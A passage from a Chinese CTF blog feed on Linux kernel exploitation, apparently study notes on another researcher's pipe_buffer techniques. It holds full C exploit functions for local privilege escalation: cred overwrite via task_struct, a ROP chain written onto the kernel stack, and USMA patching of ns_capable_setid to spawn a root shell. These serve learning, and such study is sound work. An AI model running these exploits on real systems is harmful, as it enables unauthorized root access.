<code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的(当然这题是导出了的)</p><p>所以大佬展示了一种方法,即通过解析 <code>task_struct</code> 不停的向上寻找父进程,直到找到<code>init</code>进程,<code>init</code>是所有进程的父进程,且其拥有<code>root</code>权限,当然cred就是<code>init_cred</code></p><p>将其保存并用以替换current_task的cred,以此提权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">        tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) ptask_page_addr, buf);</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (ptask_page_addr+<span class="number">0x40</span>),&amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">        <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_task = parent_task;</span><br><span class="line">    init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">    init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>),</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后个人自己实现了一下第二种方法,直接修改uid和euid为0,思路更直接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>,cred_page);</span><br><span class="line"><span class="type">int</span> offset=cred_page&amp;<span class="number">0xfff</span>;</span><br><span class="line">   cred_page=direct_map_addr_to_page_addr(cred_page);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">   evil_2nd_buf.page = cred_page;</span><br><span class="line">   evil_2nd_buf.offset = offset+<span class="number">4</span>;</span><br><span class="line">   evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> src[<span class="number">24</span>];</span><br><span class="line"><span class="built_in">memset</span>(src,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line"><span class="type">int</span> len=<span class="number">24</span>;</span><br><span class="line">   <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">   write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">         temp_zero_buf, </span><br><span class="line">         TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* write data into dst page */</span></span><br><span class="line">   write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line">   get_root_shell();</span><br></pre></td></tr></table></figure><h3 id="覆写内核栈"><a href="#覆写内核栈" class="headerlink" title="覆写内核栈"></a>覆写内核栈</h3><p>覆写内核栈实现rop自然不是什么少见的利用手法,但是这里<code>arttnba3</code>大佬找到内核栈的方法还是第一次见</p><p>学习一下</p><blockquote><p> 由于 page 结构体数组与物理内存页一一对应的缘故，我们可以很轻易地在物理地址与 page 结构体地址间进行转换，而在页表当中存放的是物理地址，我们不难想到的是<strong>我们可以通过解析当前进程的页表来获取到内核栈的物理地址，从而获取到内核栈对应的 page</strong>，之后我们可以<strong>直接向内核栈上写 ROP chain 来完成任意代码执行</strong></p><p>页表的地址可以通过 <code>mm_struct</code> 获取， <code>mm_struct</code> 地址可以通过 <code>task_struct</code> 获取，内核栈地址同样可以通过 <code>task_struct</code> 获取，那么这一切其实是水到渠成的事情：</p></blockquote><p>简单来说就是获取栈对应的<code>page</code>,然后在页上布置gadget</p><p>因为栈上是ret调用gadget,所以绕过了CFI</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>], idx = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reading the page table directly to get physical addr of kernel stack*/</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);</span><br><span class="line">    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="comment">/* N/X bit */</span></span><br><span class="line">    stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct the ROP */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        rop[idx++] = RET + kernel_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="number">54</span> + kernel_offset;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br></pre></td></tr></table></figure><p>虽然<code>arttnba3</code>大佬选择自己重新解析stack的地址stack_addr_another,但实际上直接使用stack_addr也是能够成功的</p><h4 id="虚拟地址翻译"><a href="#虚拟地址翻译" class="headerlink" title="虚拟地址翻译"></a>虚拟地址翻译</h4><p>虽然5级页表也已经挺成熟了,但现在大多数的x86机器依然是4级页表</p><p>即<code>pgd,pud,pmd,pte</code>,四级页表只使用48位,除去12位的页内偏移,剩下的36位,四级页表平分各9位</p><p>kernel pwn中遇到的也主要是四级页表</p><p>我们知道cr3寄存器存储的是pgd基址的物理内存地址,每个进程都有自己的页表,在上下文切换时,当前进程的cr3寄存器会被存入<code>task_struct-&gt;mm-&gt;pgd</code>,不过存的并不是物理地址,而是pgd在直接映射区的地址,当然<strong>直接映射区的地址减去<code>page_offset_base</code>就是物理内存地址了</strong></p><p>一般来说,一个页表有512个条目,每个条目占8字节,也就是说一个页表刚好占据一个页框,除pgd只有一个页表外,剩下的三级页表可能都会有多个页表</p><p><code>pgd,pud,pmd</code>前三级页表条目的组成如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/clipboard.png" alt=""></p><p><code>pte</code>的页表条目如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/clipboard%202.png" alt=""></p><p>PTE 有三个权限位，控制对页的访问。R/W 控制是只读还是读写；U/S 控制用户模式是否可以访问；XD 用来禁止从某些页读指令。</p><p>每次访问一个页，MMU 都会设置 A 位，称为引用位。内核可以利用这个引用位实现它的页替换算法。</p><p>每次写了一个页后，MMU 都会设置 D 位，称为修改位。修改位告诉内核在替换该页前是否必须写回牺牲页。</p><p>内核可以通过调用一条特殊的内核模式指令来清除引用位或修改位</p><p><strong>特别注意:</strong>在<code>pmd</code>表中,其页表项可能会置<code>PS</code>位,这代表<strong>不存在第四级页表<code>pte</code></strong>,而是将<code>pmd</code>表项的物理基地址对应物理内存直接当做一个大页,虚拟地址的后21位当作偏移,此外虽然上图显示是<code>4M</code>页,但实际上因为只剩下了21位,所以实际上是<code>2M</code>页,在内核页表中页表项物理基址也确实是以<code>2M</code>为单位增加的</p><p><code>大页pmd:(基址增加单位2m)</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffff9480c0000000+0xa202000+22*8</span><br><span class="line">00:0000│  0xffff9480ca2020b0 ◂— 0x8000000002c000e3</span><br><span class="line">01:0008│  0xffff9480ca2020b8 ◂— 0x2e29063</span><br><span class="line">02:0010│  0xffff9480ca2020c0 ◂— 0x80000000030000e3</span><br><span class="line">03:0018│  0xffff9480ca2020c8 ◂— 0x80000000032000e3</span><br><span class="line">04:0020│  0xffff9480ca2020d0 ◂— 0x80000000034000e3</span><br><span class="line">05:0028│  0xffff9480ca2020d8 ◂— 0x80000000036000e3</span><br><span class="line">06:0030│  0xffff9480ca2020e0 ◂— 0x80000000038000e3</span><br><span class="line">07:0038│  0xffff9480ca2020e8 ◂— 0x8000000003a000e3</span><br></pre></td></tr></table></figure><p><code>4k页pmd:</code>(基址增加单位4k)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffff9480c0000000+0x2a4f000+268*8</span><br><span class="line">00:0000│  0xffff9480c2a4f860 ◂— 0x8000000002d70063 /* <span class="string">&#x27;c&#x27;</span> */</span><br><span class="line">01:0008│  0xffff9480c2a4f868 ◂— 0x8000000002d71063</span><br><span class="line">02:0010│  0xffff9480c2a4f870 ◂— 0x8000000002d72063</span><br><span class="line">03:0018│  0xffff9480c2a4f878 ◂— 0x8000000002d73063</span><br></pre></td></tr></table></figure><h3 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h3><p>解析目标内核代码物理地址paddr</p><p>用户mmap映射一段虚拟地址vaddr,然后劫持vaddr的页表的pte表项为paddr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_usma</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *kcode_map, *kcode_func;</span><br><span class="line">    <span class="type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    kcode_map = mmap((<span class="type">void</span>*) <span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kcode_map) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* because of lazy allocation, we need to write it manually */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        kcode_map[i] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">        kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code seg to exec shellcode directly :) */</span></span><br><span class="line">    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">           dst_vaddr);</span><br><span class="line"></span><br><span class="line">    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);</span><br><span class="line">    dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remapping to our mmap area */</span></span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span>, dst_paddr);</span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span> + <span class="number">0x1000</span>, dst_paddr + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code segment directly */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">     * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>); <span class="comment">/* nop */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>, </span><br><span class="line">            <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="comment">/* endbr64 */</span></span><br><span class="line">            <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="comment">/* mov rax, 1 */</span></span><br><span class="line">            <span class="string">&quot;\xc3&quot;</span>, <span class="comment">/* ret */</span></span><br><span class="line">            <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get root now :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ns_capable_setid</code>函数用于在setreid时判断是否具有权限</p><p>我们劫持其为始终返回<code>1</code>,即拥有任意设置id的权限</p>]]></content>
    
    
    <summary type="html">orz</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>kernel小记</title>
    <link href="https://ixout.github.io/posts/57127/"/>
    <id>https://ixout.github.io/posts/57127/</id>
    <published>2024-03-22T02:22:04.000Z</published>
    <updated>2024-04-06T14:46:37.780Z</updated>
    
    <content type="html"><![CDATA[<h1 id="版本相关"><a href="#版本相关" class="headerlink" title="版本相关"></a>版本相关</h1><h2 id="过时"><a href="#过时" class="headerlink" title="过时"></a>过时</h2><h3 id="prepare-kernel-cred-NULL"><a href="#prepare-kernel-cred-NULL" class="headerlink" title="prepare_kernel_cred(NULL)"></a>prepare_kernel_cred(NULL)</h3><p><strong>过时版本:6.2</strong></p><p>自从<strong><u>内核版本 6.2</u></strong> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，这使得这种提权方法<strong>无法再应用于 6.2 及更高版本的内核：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h3 id="UAF-cred-jar"><a href="#UAF-cred-jar" class="headerlink" title="UAF cred_jar"></a>UAF cred_jar</h3><p><strong>过时版本:4.5</strong></p><p>从4.5版本开始,我们已无法直接分配到 cred_jar 中的 object<strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时(默认开启)</strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h3><p><strong>过时版本:5.13</strong></p><p><strong>在5.13,内核入栈时添加了一个偏移值,这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="line">index <span class="number">4</span>efd39aacb9f2.<span class="number">.7</span>b2542b13ebd9 <span class="number">100644</span></span><br><span class="line">--- a/arch/x86/entry/common.c</span><br><span class="line">+++ b/arch/x86/entry/common.c</span><br><span class="line">@@ <span class="number">-38</span>,<span class="number">6</span> +<span class="number">38</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"> __visible noinstr <span class="type">void</span> <span class="title function_">do_syscall_64</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> nr, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line"> &#123;</span><br><span class="line">+    add_random_kstack_offset();</span><br><span class="line">     nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"></span><br><span class="line">     instrumentation_begin();</span><br></pre></td></tr></table></figure><h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p><strong>过时版本:5.11</strong></p><p>在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//before</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//now:</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly;</span><br></pre></td></tr></table></figure><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>Linux 4.15 中引入了 KPTI 机制，并且该机制被反向移植到了 Linux 4.14.11，4.9.75，4.4.110</p><h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><h2 id="tty-struct"><a href="#tty-struct" class="headerlink" 